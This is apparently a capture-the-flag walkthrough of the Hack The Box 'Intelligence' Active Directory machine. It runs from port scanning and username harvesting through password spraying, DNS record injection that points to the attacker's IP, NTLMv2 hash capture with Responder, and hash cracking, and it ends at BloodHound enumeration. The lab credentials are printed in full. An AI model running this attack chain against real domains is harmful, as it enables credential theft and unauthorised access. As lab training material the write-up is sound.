# Intelligence

# User Flag

## NMAP Enumeration

NMAP Port Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.248

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49739/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.248 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49683,49684,49694,49739

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-22 22:50:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-22T22:52:21+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-22T22:28:03
| Not valid after:  2025-06-22T22:28:03
| MD5:   a9d5:6c92:b581:0378:3dd4:7036:c81e:a275
|_SHA-1: 0ac4:e42f:df47:3d9f:88dd:d22c:42d4:7ed9:1f16:70e5
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-22T22:28:03
| Not valid after:  2025-06-22T22:28:03
| MD5:   a9d5:6c92:b581:0378:3dd4:7036:c81e:a275
|_SHA-1: 0ac4:e42f:df47:3d9f:88dd:d22c:42d4:7ed9:1f16:70e5
|_ssl-date: 2024-06-22T22:52:21+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-22T22:52:21+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-22T22:28:03
| Not valid after:  2025-06-22T22:28:03
| MD5:   a9d5:6c92:b581:0378:3dd4:7036:c81e:a275
|_SHA-1: 0ac4:e42f:df47:3d9f:88dd:d22c:42d4:7ed9:1f16:70e5
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-22T22:52:21+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-22T22:28:03
| Not valid after:  2025-06-22T22:28:03
| MD5:   a9d5:6c92:b581:0378:3dd4:7036:c81e:a275
|_SHA-1: 0ac4:e42f:df47:3d9f:88dd:d22c:42d4:7ed9:1f16:70e5
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-22T22:51:44
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

## HTTP Port 80 - Enumeration

Found a potential user `contact@intelligence.htb` while looking through the website.

Used `ffuf` to enumerate hidden directories:

```bash
ffuf -u http://10.10.10.248/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

documents               [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 79ms]
Documents               [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 109ms]
```

The `documents` sub-directory contains PDF uploads with the naming convention seen below:

```bash
2020-01-01-upload.pdf
2020-12-15-upload.pdf
```

Used Burpsuite Intruder and the observed naming convention to see if there were any other documents under this sub directory. Used the payload ClusterBomb and set the variables to the month and date.

![BurpSuite Intruder](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Intelligence/Images/BurpSuite%20Intruder.png)

Found a PDF titled `2020-06-04-upload.pdf` that contained a password `NewIntelligenceCorpUser9876`:

![Account Guide](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Intelligence/Images/Account%20Guide.png)

Found a PDF titled `2020-12-30-upload.pdf` which contains potnetial user `ted` and reference to **service accounts**:

![Internal IT Update](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Intelligence/Images/Internal%20IT%20Update.png)

## SMB Enumeration

Used `enum4linux` but did not return anything of interest.

```bash
enum4linux -a 10.10.10.248 > enum4linux.txt
```

Tested for NULL shares with anonymous login. Was successful but did not return any shares:

```bash
smbclient -L //10.10.10.248 -N
             
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
```

Tried enumerating shares with `crackmapexec` but didn't return anything useful.

```bash
crackmapexec smb 10.10.10.248 -u '' -p '' --shares
crackmapexec smb 10.10.10.248 -u 'guest' -p '' --shares
crackmapexec smb 10.10.10.248 -u '' -p '' --users
crackmapexec smb 10.10.10.248 -u 'guest' -p '' --users
crackmapexec smb 10.10.10.248 -u '' -p '' --shares -M spider_plus
```

## LDAP Enumeration

Extracted base naming contexts:

```bash
ldapsearch -x -H ldap://10.10.10.248 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Attempted to extract users via LDAP:

```bash
ldapsearch -x -H ldaps://10.10.10.248:3269 -D '' -w '' -b "DC=intelligence,DC=htb" '(objectClass=person)'
```

## PDF File Enumeration

Spent some time doing some other enumeration to find potential usernames for the credentials found. Running `exiftool` against the PDF's returns the creators names:

```bash
exiftool *.pdf | grep "Creator"

Creator                         : William.Lee
Creator                         : Jason.Patterson
Creator                         : Jose.Williams
Creator                         : Jason.Patterson
```

Used `kerbrute` to confirm the users are valid:

```bash
sudo ./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Intelligence/userlist

2024/06/23 12:47:36 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/06/23 12:47:36 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/06/23 12:47:36 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2024/06/23 12:47:36 >  Done! Tested 5 usernames (3 valid) in 0.067 seconds
```

Need to download the rest of the files, use python script to generate a list of file names and wget to download these files.

```bash
for i in $(cat dates_2020.txt); do wget http://10.10.10.248/documents/$i; done
```

Pulled users from the pdf and removed duplicates:

```bash
exiftool *.pdf | grep 'Creator' | awk -F ': ' '{print $2}' | sort | uniq > userlist
```

Used `kerbrute` to validate usernames:

```bash
sudo ./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Intelligence/userlist

2024/06/23 15:16:25 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/06/23 15:16:25 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
```

Used `crackmapexec` to see what users could be used with the passowrd `NewIntelligenceCorpUser9876`:

```bash
# failed
crackmapexec winrm 10.10.10.248 -u userlist -p 'NewIntelligenceCorpUser9876'

# success
crackmapexec smb 10.10.10.248 -u userlist -p 'NewIntelligenceCorpUser9876'

SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

Enumerated shares:

```bash
crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares

SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ
```

Can signin to Users share and get user flag:

```bash
smbclient //10.10.10.248/Users --user Tiffany.Molina --password NewIntelligenceCorpUser9876

smb: \Tiffany.Molina\> cd Desktop\
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Mon Apr 19 01:51:46 2021
  ..                                 DR        0  Mon Apr 19 01:51:46 2021
  user.txt                           AR       34  Sat Jun 29 20:13:10 2024
```

# Root Flag

## SMB Enumeration (Pt. 2)

Enumerated shares:

```bash
crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares

SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ
```

Checked `IT` share and found a file titled `downdetector.ps1`:

```bash
smbclient //10.10.10.248/IT --user Tiffany.Molina --password NewIntelligenceCorpUser9876

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 01:50:55 2021
  ..                                  D        0  Mon Apr 19 01:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021

                3770367 blocks of size 4096. 1462185 blocks available
smb: \> get downdetector.ps1
```

Contents of PowerShell script can be seen below:

```ps
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

The script goes into LDAP and gets a list of all the computers, and then loops over the ones where the name starts with “web”. It will try to issue a web request to that server (with the running users’s credentials), and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.

Used `dnstools.py` to add a fake VHOST that doesn’t exist starting with `web` to the zone . This will trigger the script and send a mail to Ted:

```bash
sudo python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webfakedomain.intelligence.htb --data 10.10.14.16 10.10.10.248
```

Next, I used responder to sniff and get the password hash of the Ted user:

```bash
sudo python3 /usr/share/responder/Responder.py -I tun0 -dwv

[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:f049e137177f4d9a:E427D0FCE86796763E534287C15A3B20:01010000000000007DBFB0E35DCADA01112143B348F95DB5000000000200080041004D004A004F0001001E00570049004E002D0056004C00380056004E004600330059004F004C004B000400140041004D004A004F002E004C004F00430041004C0003003400570049004E002D0056004C00380056004E004600330059004F004C004B002E0041004D004A004F002E004C004F00430041004C000500140041004D004A004F002E004C004F00430041004C000800300030000000000000000000000000200000AEFD1472DFBA3F0B525CEAB8370C65FE44BE0EFDFFCF366E473B8C2FC43B8E8C0A001000000000000000000000000000000000000900460048005400540050002F00770065006200660061006B00650064006F006D00610069006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Used `hashcat64.exe` to crack the hash:

```bash
hashcat64.exe -m 5600 hash.txt rockyou.txt -o cracked.txt
```

New set of credentials: `Ted.Graves:Mr.Teddy`

Checked for WinRM and SMB access:

```bash
# failed
crackmapexec winrm 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'

# success
crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
```

## Bloodhound

Used bloodhound to enumerate the domain:

```bash
bloodhound-python -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' -c All
```

![Bloodhound](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Intelligence/Images/Bloodhound.png)


























